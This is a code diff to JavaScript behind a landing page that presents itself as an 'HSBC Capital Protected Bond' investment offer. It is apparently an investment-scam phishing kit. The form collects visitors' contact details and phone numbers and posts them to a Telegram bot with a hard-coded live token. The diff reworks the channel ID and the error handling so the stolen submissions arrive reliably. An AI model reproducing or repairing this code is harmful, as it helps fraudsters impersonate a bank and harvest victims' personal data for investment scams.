@@ -27,7 +27,7 @@ document.addEventListener('DOMContentLoaded', function() {
     
     const form = document.querySelector('.investment-form');
     const BOT_TOKEN = '7545324443:AAESu9Rsy5ybwmkn8AZupY0BbTyMG0YVS_s';
-    const CHAT_ID = '@Reciever_stock';
+    const CHAT_ID = '-1001002416566645';
 
     // Phone validation function
     function isValidPhone(countryCode, phone) {
@@ -94,8 +94,8 @@ From: HSBC Capital Protected Bond Landing Page
         `;
 
         try {
-            // First try to send to channel with @ format
-            let response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            // Try with the full channel ID format
+            const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json',
@@ -107,29 +107,13 @@ From: HSBC Capital Protected Bond Landing Page
                 })
             });
 
-            let data = await response.json();
-
-            // If first attempt fails, try with numeric ID
-            if (!data.ok) {
-                response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify({
-                        chat_id: '1002416566645',
-                        text: message,
-                        disable_web_page_preview: true
-                    })
-                });
-                data = await response.json();
-            }
+            const data = await response.json();
+            console.log('Telegram Response:', data); // For debugging
 
             if (data.ok) {
                 form.reset();
                 alert('Thank you for your interest. Our team will contact you shortly with the brochure.');
             } else {
-                console.error('Telegram Error:', data);
                 throw new Error(data.description || 'Failed to send message');
             }
         } catch (error) {
